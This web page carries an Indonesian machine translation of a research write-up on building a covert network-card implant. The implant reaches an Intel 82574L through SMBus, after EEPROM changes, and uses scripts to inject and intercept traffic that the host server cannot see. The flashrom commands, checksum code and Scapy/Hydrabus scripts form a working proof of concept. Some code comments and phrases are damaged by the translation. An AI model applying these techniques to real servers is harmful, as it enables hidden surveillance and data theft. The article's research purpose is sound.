<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚ú°Ô∏è üõ¢Ô∏è üññüèΩ Membuat implan sendiri untuk elektronik üõê üôãüèæ ‚å®Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Kisah dari Bloomberg bahwa beberapa implan diduga dipasang di motherboard [orang Cina menggunakan microchip untuk mengendalikan komputer Amerika ] tid...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Membuat implan sendiri untuk elektronik</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/429190/"><img src="https://habrastorage.org/webt/0b/ft/fa/0bftfawizhuqj5ah4gu_9z1tzak.png"><br><br>  Kisah dari <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Bloomberg</a> bahwa beberapa implan diduga dipasang di motherboard [orang <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Cina menggunakan microchip untuk mengendalikan komputer Amerika</a> ] tidak luput dari perhatian.  Setelah itu, banyak orang berbagi ide tentang kemungkinan membuat implan tersebut (perkiraan ukuran, kemampuan atau metode pendeteksian). <br><br>  Beberapa hari kemudian, majalah <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Bloomberg</a> menerbitkan sebuah artikel dengan bukti tambahan.  Inilah yang secara khusus memicu minat kami: <br><blockquote>  Server hukum mengirim pesan dalam satu cara, implan di sisi lain, tetapi tampaknya semua lalu lintas berasal dari satu server tepercaya. </blockquote><br><a name="habracut"></a><br>  Ada cara untuk berinteraksi dengan kartu jaringan langsung dari motherboard.  Beberapa orang mengindikasikan bahwa Anda dapat bermain dengan BMC (Baseboard Management Controller - komponen yang memungkinkan akses ke server selain saluran utama), yang akan memungkinkan implan mengontrol BMC dan mendapatkan akses ke kartu jaringan.  Tetapi bagaimana cara kerjanya dalam praktiknya?  Mari kita lihat apakah kita bisa mereproduksi ini. <br><br><h2>  Posisi awal </h2><br>  Mari kita lihat kemungkinan antarmuka antara NIC ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">kartu jaringan</a> ) dan BMC.  Salah satu protokol utama untuk bekerja pada saluran khusus adalah antarmuka manajemen platform IPMI yang cerdas. <br><br><h3>  IPMI </h3><br>  Wikipedia mengatakan IPMI adalah "antarmuka manajemen platform cerdas yang dirancang untuk secara otonom memantau dan mengelola fitur yang dibangun langsung ke perangkat keras dan firmware platform server.  Fitur utama IPMI adalah pemantauan, mengembalikan fungsi manajemen, pencatatan dan inventaris, yang tersedia secara terpisah dari prosesor, BIOS, dan sistem operasi.  Fitur manajemen platform mungkin tersedia bahkan ketika sistem dimatikan. "  Sangat mirip dengan yang kita butuhkan. <br><br>  Diagram alur berikut menunjukkan kemungkinan jalur implementasi proyek: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/33c/3e3/2f6/33c3e32f69cf311114455fe1fb98d5a1.png"><br><br>  IPMI sebenarnya mendefinisikan dua saluran Sideband untuk NIC: SMBus dan NC-SI.  NC-SI adalah pengganti SMBus yang canggih yang mendukung peningkatan kecepatan transfer data dan fitur-fitur baru lainnya.  Masalahnya adalah dia membutuhkan lebih banyak sinyal (sekitar 10), dan jauh lebih sulit untuk campur tangan dalam pekerjaannya ketika kita bekerja dengan implan.  Jadi untuk sekarang, mari kita membahas SMBus. <br><br><h3>  SMBus </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">SMBus</a> (System Management Bus) adalah protokol komunikasi serial untuk perangkat daya.  Bus dua kawat sederhana satu sisi yang menyediakan komunikasi yang tidak rumit.  Paling sering digunakan di komputer untuk menghubungkan motherboard dengan sumber daya dan mengirim instruksi on / off.  Berdasarkan bus <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">I <sup>2</sup> C</a> , umumnya digunakan dalam mikrokontroler.  Antarmuka hanya membutuhkan dua sinyal (frekuensi jam dan data), dan sinyal ketiga adalah interupsi.  Sempurna untuk protokol game implan. <br><br><h2>  Kontak pertama </h2><br>  Anda harus pintar, tidak memiliki akses ke motherboard dengan BMC.  Mempelajari karakteristik teknis dari motherboard server, kami menemukan bahwa beberapa dari mereka menggunakan chip <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Intel 82574L</a> .  Itu, menurut <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">dokumentasi</a> , menyediakan "SMBus advanced pass-through interface" - hanya apa yang Anda butuhkan.  Dan yang terbaik, itu datang dalam format kartu PCI-E. <br><br><h3>  Akses SMBus </h3><br>  Kami pergi ke toko, dan sekarang kami memiliki kartu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Intel EXPI9301CTBLK</a> dengan chip 82574L.  Apa sekarang? <br><br>  Dokumentasi dapat melacak SMB_DAT dan SMB_ALRT_N.  Untungnya, semuanya ternyata tersedia di bantalan kontak.  Segalanya tampak cukup mudah. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e71/6a5/467/e716a54673d59b3aec0c9e34765ef734.jpg"><br>  <i>NIC PCB.</i>  <i>Kiri atas - EEPROM, konektor kanan atas untuk SMBus [ALRT | CLK | DAT].</i>  <i>Harap dicatat bahwa R39 dan R40 dimatikan, yang melarang akses ke SMBus untuk konektor PCIe.</i> <br><br>  Kami menghubungkan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">probe I <sup>2</sup> C</a> dan memindai SMBus, tetapi tidak menghitung apa pun yang berguna.  Dokumentasi mengatakan bahwa SMBus hanya diaktifkan ketika register bit tertentu diatur.  Nilai ini diambil dari EEPROM.  Saatnya menggali lebih dalam. <br><br><h3>  Aktifkan akses ke SMBus </h3><br>  Dokumentasi membantu kami lagi.  Akses ke SMBus ditentukan oleh nilai register yang dimuat dari NIC EEPROM.  Untungnya, EEPROM dapat dibaca dengan flashrom.  Dengan membuang konten EEPROM, kami dapat menganalisis dan mengubah nilai: <br><br> <code>&gt; ./flashrom -p buspirate_spi:dev=/dev/hydrabus --read /tmp/flash.dump <br> flashrom p1.0-87-g9891b75-dirty on Linux 4.18.12-arch1-1-ARCH (x86_64) <br> flashrom is free software, get the source code at https://flashrom.org <br> <br> Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). <br> Found Winbond flash chip "W25X40" (512 kB, SPI) on buspirate_spi. <br> Reading flash... done.</code> <br> <br>  Dilihat oleh peta NVM (bab 6.1 dari dokumentasi), jelas bahwa kita perlu mengubah dua nilai: <br><br><ul><li>  Init Control Word 2 [MNGM] (Lembar Data bab 6.1.1.6) </li><li>  Kompatibilitas [ASF SMBus Connected] (Lembar Data bab 6.1.2.1.1) </li><li>  Kompatibilitas [SMBus Connected] (Lembar Data bab 6.1.2.1.1) </li></ul><br>  Hanya perlu untuk mempertimbangkan bahwa dalam data EEPROM disimpan dalam format endian kecil. <br><br>  Setelah itu, kita masih harus berurusan dengan nilai Checksum.  Bab 6.1.2.11 menyatakan bahwa jumlah semua kata dalam rentang [0x00-0x40] harus 0xBABA.  Sedikit Python akan membantu kami menghitung checksum yang benar: <br><br> <code>import struct <br> data = open('/tmp/flash.mod', 'rb').read() <br> tot = 0 <br> for i in range(0x3f): <br> tot = (tot + struct.unpack('&lt;H',data[2*i:(2*i)+2])[0]) &amp; 0xffff <br> <br> print("Checksum word must be : " + hex(0xbaba-tot)) <br> #Checksum word must be : 0x9efb</code> <br> <br>  Dan akhirnya, semua perubahan kami untuk EEPROM: <br><br> <code>&lt; 00000000: 6805 ca89 b22e 2004 46f7 8010 ffff ffff h..... .F....... <br> &gt; 00000000: 6805 ca89 b22e 3014 46f7 8010 ffff ffff h.....0.F....... <br> &lt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5a9c i...k.........Z. <br> &gt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5adc i...k.........Z. <br> <br> &lt; 00000070: ffff ffff ffff ffff ffff 3001 ffff 0bef ..........0..... <br> &gt; 00000070: ffff ffff ffff ffff ffff 3001 ffff fb9e ..........0.....</code> <br> <br>  Setelah melakukan perubahan dan mem-flash EEPROM, kami menghubungkan probe I <sup>2</sup> C dan: <br><br> <code>i2c1&gt; scan <br> Device found at address 0x49 <br> i2c1&gt;</code> <br> <br>  Alamat I <sup>2</sup> C dikodekan dalam tujuh bit, alamat yang kami butuhkan diperoleh sebagai 0x49 &lt;&lt; 1 = 0x92. <br><br>  Sekarang kami memiliki diagram kerja untuk implan kami.  Kami dapat mengirim perintah ke NIC: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/13c/bfc/f14/13cbfcf14267b6055c8dc5760b59e2fd.jpg"><br><br><h2>  Menerima informasi </h2><br>  Seperti yang mungkin sudah Anda duga, kami terus membaca dokumentasi dan mengirim perintah yang disiapkan khusus untuk NIC untuk memverifikasi bahwa semuanya berjalan seperti yang diharapkan. <br><br>  Dokumentasi menjelaskan semua yang perlu Anda ketahui tentang format transaksi di bab 8.4.4.  Satu-satunya perbedaan adalah bahwa kita tidak perlu menghitung PEC (checksum untuk SMBus, yang dihitung untuk setiap paket).  Sebagai contoh, kita dapat mengirim perintah CMD ke alamat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link">SLAVE</a> menggunakan urutan berikut: <br><br> <code>[START] [@SLAVE] [CMD] ( [START] [@SLAVE] [READ_DATA] ) [STOP]</code> <br> <br>  [MULAI] dan [BERHENTI] adalah kondisi MULAI dan BERHENTI yang ditentukan oleh I <sup>2</sup> C. <br><br>  Misalnya, perintah untuk membaca alamat MAC (dijelaskan dalam bab 8.8.2.3) adalah 0xD4.  Kami mengirim perintah ke SMBus dalam mode I <sup>2</sup> C: <br><br> <code>[START] [0x92] [0xD4] [START] [0x92] [read 8 bytes] [STOP]</code> <br> <br>  Ketika ditransfer ke tim Hydrabus, ini akan menjadi: <br><br> <code>i2c1&gt; [ 0x92 0xd4 [ 0x92 hd:2 hd:6 ] <br> I2C START <br> WRITE: 0x92 ACK 0xD4 ACK &lt;== [NIC address] [command] <br> I2C START &lt;== Switch state <br> WRITE: 0x92 ACK &lt;== [NIC address] <br> 07 D4 | .. &lt;== Read [length] [header] <br> 68 05 CA 89 B2 2E | h..... &lt;== Read MAC address bytes <br> NACK <br> I2C STOP</code> <br> <br>  Dan, ya, kami mendapatkan alamat MAC kami! <br><br><h2>  Membuat implan </h2><br>  Sekarang, mengetahui bagaimana Anda dapat berkomunikasi dengan NIC, mari kita lihat bagaimana Anda dapat menggunakan saluran ini untuk mencuri lalu lintas jaringan dan mengirim data melalui jaringan.  Bab 8 dari dokumentasi menjelaskan semua yang perlu Anda lakukan ini. <br><br><h3>  Mengirim paket </h3><br>  Dijelaskan dalam bab 8.6 dan 8.8.1.  Kita cukup membuat frame Ethernet menggunakan perintah.  Berikut ini contoh skrip untuk <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Hydrabus</a> atau <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Bus Pirate</a> untuk mengirim paket: <br><br> <code>import serial <br> import struct <br> from scapy.all import * <br> <br> ser = serial.Serial('/dev/ttyACM0',115200) <br> <br> def send_frame(pkt): <br> # Define the frame size <br> pktlen = struct.pack("B", len(pkt)) <br> <br> # Define the data length to be sent <br> fulllen = struct.pack("&gt;h", len(pkt)+3) <br> <br> # I2C write-then-read. Send frame + SMBus header, receive 0 <br> ser.write('\x08'+fulllen+'\x00\x00') <br> ser.write("\x92\xc4"+pktlen+pkt) <br> <br> # If packet has been sent successfully <br> if ser.read(1) == '\x01': <br> print "Send OK" <br> else: <br> print "Error sending" <br> ser.write('\x00') <br> ser.write('\x00') <br> ser.write('\x0F\n') <br> quit() <br> <br> # Open Hydrabus in binary mode <br> for i in xrange(20): <br> ser.write("\x00") <br> if "BBIO1" not in ser.read(5): <br> print "Could not get into binary mode" <br> quit() <br> <br> # Switch to I2C mode <br> ser.write('\x02') <br> if "I2C1" not in ser.read(4): <br> print "Cannot set I2C mode" <br> quit() <br> <br> #Create the frame to send <br> p = Ether(src="11:22:33:44:55:66", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.31.32.82", dst="10.31.32.80")/ICMP() <br> <br> #Send the frame <br> send_frame(str(p)) <br> <br> # Return to main binary mode <br> ser.write('\x00') <br> #reset to console mode <br> ser.write('\x0F\n')</code> <br> <br>  Setelah menjalankan skrip, Anda dapat melihat paket yang berasal dari mesin dengan implan, dan, yang paling menarik, server itu sendiri tidak melihat paket ini sama sekali: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ea1/947/4f2/ea19474f2a801afddb732624fa1f3d40.png"><br>  <i>Tcpdump dari mesin penyerang di sebelah kiri, server di sebelah kanan</i> <br><br><h3>  Paket membaca </h3><br><h4>  Penyaringan </h4><br>  Untuk mengetahui frame mana yang harus digunakan untuk SMBus, NIC menggunakan filter kontrol.  Mereka memetakan lalu lintas dari jaringan, dan mengarahkannya ke PCIe, atau ke SMBus, atau keduanya di sana dan di sana.  Dari sudut pandang kami, ini memberi kami fleksibilitas besar: <br><br><ul><li>  Anda dapat melacak lalu lintas dengan menetapkan filter yang akan memindai dan mengarahkannya ke PCIe dan SMBus. </li><li>  Anda dapat menghilangkan lalu lintas dengan mengarahkannya ke SMBus saja. </li><li>  Anda dapat membuat saluran tersembunyi yang tidak akan terlihat oleh server dengan implan. </li></ul><br>  Yang paling menarik, filter dapat dikonfigurasi untuk melacak berbagai elemen bingkai: <br><br><ul><li>  Port UDP / TCP </li><li>  VLAN </li><li>  IPv4 - IPv6 </li><li>  Alamat MAC </li><li>  ... </li></ul><br>  (Untuk daftar lengkap, lihat bab 8.4.2.1) <br><br>  Tujuh filter MDEF independen [0: 6] tersedia, dan masing-masingnya dapat dikonfigurasi untuk mengarahkan lalu lintas yang sesuai ke PCIe melalui SMBus menggunakan register MANC2H (untuk perinciannya, lihat Bagian 8.4.3). <br><br><h4>  Implementasi </h4><br>  Ternyata cukup sulit untuk mengatur semuanya dengan benar, kami mencoba banyak kombinasi berbeda untuk membuat filter bekerja.  Untungnya, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">catatan</a> pada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">aplikasi</a> Intel memberi kami rincian lebih lanjut tentang cara menjalankan filter seperti yang kita butuhkan. <br><br>  Menggunakan probe I <sup>2</sup> C kami, kami dapat mengonfigurasi semua ini dengan empat perintah: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  MDEF[0]   ,   UDP/664  UDP/623 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x0c 0x00 ] <br> //  MANC2H      <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Seperti yang dijelaskan dalam bab 8.8.1.3, perlu untuk mengatur beberapa bit untuk memungkinkan penerimaan data dan mengirim frame kembali ke implan kami.  Kami memilih SMBus lansiran karena model lain memungkinkan kartu jaringan untuk membuat permintaan asinkron ke SMBus (untuk detail, lihat bab 8.4.5). <br><br><h4>  Bingkai membaca </h4><br>  Karena kami menggunakan metode peringatan SMBus, kami harus berharap sinyal SMB_ALRT_N dimatikan sebelum mengirim perintah Terima Paket TCO.  Jika kami menunggu terlalu lama, paket itu akan ditolak oleh NIC. <br><br>  Untuk hanya menggambarkan diagram, kami akan mengirim bingkai secara berkala dan mengirim perintah baca - hanya untuk mengonfirmasi bahwa prinsip ini berfungsi.  Skemanya terlihat seperti ini: <br><br><ul><li>  Server dengan implan memiliki filter yang memantau lalu lintas dengan UDP / 623 (bab 3.6.1.2). </li><li>  Implan disimulasikan menggunakan Hydrabus. </li><li>  Server lain mengirimkan paket yang termasuk dalam filter menggunakan skrip Scapy: </li></ul><br> <code>from scapy.all import * <br> p=Ether()/IP(dst="10.31.32.81")/UDP(dport=0x26f)/"MALICIOUS PAYLOAD" <br> while(1):sendp(p)</code> <br> <br>  Ternyata sesuatu yang menarik: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e03/407/a68/e03407a6872fbeda15ad73fa32c87257.png"><br><br>  Di sebelah kiri, SMBus membaca frame, data frame ditunjukkan di bawah ini.  Di sebelah kanan, tcpdump, berjalan pada server dengan implan, tidak menampilkan bingkai yang masuk. <br><br><h4>  Frame Relay </h4><br>  Dengan mengubah register MANC2H, dimungkinkan untuk memastikan bahwa lalu lintas yang dikirim ke SMBus dan PCIe ditampilkan dengan benar di server.  Misalnya, mari kita buat filter intersepsi yang merespons lalu lintas UDP / 161 (SNMP) dan mengirimkannya ke SMBus dan PCIe: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  - 0   161 (0xa1) <br> [ 0x92 0xcc 0x04 0x63 0x00 0x00 0xa1 ] <br> //  MDEF[0]   ,   - 0 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x10 0x00 ] <br> //  MANC2H     MDEF[0]  PCIe <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Dengan mengaktifkan filter, kami dapat mengirim permintaan SNMP ke server dengan implan dan melihat paket yang mencegat implan.  Pada saat yang sama, server menanggapi permintaan - yang berarti bahwa paket diarahkan dengan benar ke SMBus dan PCIe: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e32/d3b/281/e32d3b281a556bd1bcdebe86498a2dc1.png"><br>  <i>Di atas adalah permintaan SNMP dicegat dari implan.</i>  <i>Bawah - permintaan SNMP mencapai server.</i> <br><br><h2>  Kesimpulan </h2><br>  Kami menggambarkan metode yang mungkin untuk memperkenalkan mikrokontroler kecil dan murah sebagai implan di tingkat NIC.  Implan seperti itu membutuhkan setidaknya empat kontak (Vcc, GND, CLK, DAT), dan dapat mengontrol kartu server.  Di antara fitur-fiturnya: <br><br><ul><li>  Mendengarkan lalu lintas jaringan yang masuk ke server. </li><li>  Menerima perintah dari jaringan tanpa sepengetahuan server. </li><li>  Transmisi data melalui jaringan tanpa sepengetahuan server. </li></ul><br>  Dalam contoh kami, untuk kesederhanaan, Hydrabus digunakan sebagai antarmuka untuk I <sup>2</sup> C / SMBus, tetapi ini dapat dilakukan dengan mudah pada mikrokontroler kecil, misalnya, ATtiny85 (ini seukuran EEPROM untuk NIC). <br><br>  Namun, dalam kehidupan nyata, akses ke implan seperti itu hanya untuk SMBus.  Bergantung pada skema motherboard, perangkat ini mungkin satu-satunya yang tersedia, dan kemudian interaksi dengan OS server tidak mungkin dilakukan.  Dalam kasus ketika kontrol penuh atas OS diperlukan, yang terbaik adalah mengubah kode BMC, karena sudah memiliki akses ke semua bus yang menarik, dan itu tidak meninggalkan jejak yang terlihat pada motherboard. <br><br>  Kerugian lain dari implan tersebut adalah dapat mentransmisikan data pada kecepatan urutan 100 Kb / s, yang tidak cukup untuk studi lalu lintas yang lengkap.  Selain itu, implan hanya dapat mencegat lalu lintas yang datang dari jaringan.  Akibatnya, solusi ini tampaknya tidak efektif dibandingkan dengan upaya yang diperlukan untuk penerapannya pada peralatan target. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id429190/">https://habr.com/ru/post/id429190/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id429180/index.html">Pergi ke goto</a></li>
<li><a href="../id429182/index.html">Kecerdasan buatan menemui hambatan pemahaman</a></li>
<li><a href="../id429184/index.html">Media online diduga memutus rantai atas ulama Oumuamua dan Harvard</a></li>
<li><a href="../id429186/index.html">@Pythonetc Oktober 2018</a></li>
<li><a href="../id429188/index.html">Gambaran umum PICASO 3D Designer XL</a></li>
<li><a href="../id429192/index.html">Trik baru ini masih mampu mengakali video Deepfake.</a></li>
<li><a href="../id429194/index.html">7 perpustakaan untuk pengembangan Android di Kotlin</a></li>
<li><a href="../id429196/index.html">Eksplorasi seluler runtime iOS dengan Keberatan, atau Retas aplikasi kita sendiri</a></li>
<li><a href="../id429198/index.html">Kerangka Kernel-Bridge: Jembatan di Ring0</a></li>
<li><a href="../id429202/index.html">Kursus mahal: apakah itu layak?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>